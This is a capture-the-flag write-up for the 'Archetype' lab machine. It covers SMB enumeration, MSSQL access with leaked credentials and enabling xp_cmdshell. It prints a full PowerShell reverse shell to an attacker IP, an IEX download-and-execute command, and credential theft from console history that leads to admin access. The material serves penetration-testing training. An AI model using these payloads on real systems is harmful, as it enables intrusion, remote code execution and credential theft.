# ARCHETYPE 
```
IP = 10.10.10.27
```

Enumeration
---------------------
+ Ran initial and all vuln nmap scan.
+ Enumerated SMB shares using:
	`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse -oN nmap/smb.nmap 10.10.10.27`
+ Found /backups smb path containing a file called `prod.dtsConfig`
+ The file contains a password [M3g4c0rp123] and userID [ARCHETYPE\sql_svc]
+ Logged into the mssqlserver using impacket:
	`mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth`
+ Checked if current user has admin using:
	`SELECT IS_SRVROLEMEMBER('sysadmin')`
+ Enabled xp_cmdshell and gained RCE using following commands:
	`EXEC sp_configure 'Show Advanced Options', 1;`
	`reconfigure;`
	`sp_configure;`
	`EXEC sp_configure 'xp_cmdshell', 1`
	`reconfigure;`
	`xp_cmdshell "whoami"`

Exploitation 
---------------------
+ Now to pop a shell, store the following as powershell payload:
	`$client = New-Object System.Net.Sockets.TCPClient("10.10.14.90",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
+ Executed following command to upload and execute shell.ps1:
	`xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.90/shell.ps1\");"`

Privilege Escalation
---------------------
+ Checked windows powershell console history using:
	`type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
+ Found administrator password. [MEGACORP_4dm1n!!]
Logging in as admin using impacket:
	`psexec.py administrator@10.10.10.27`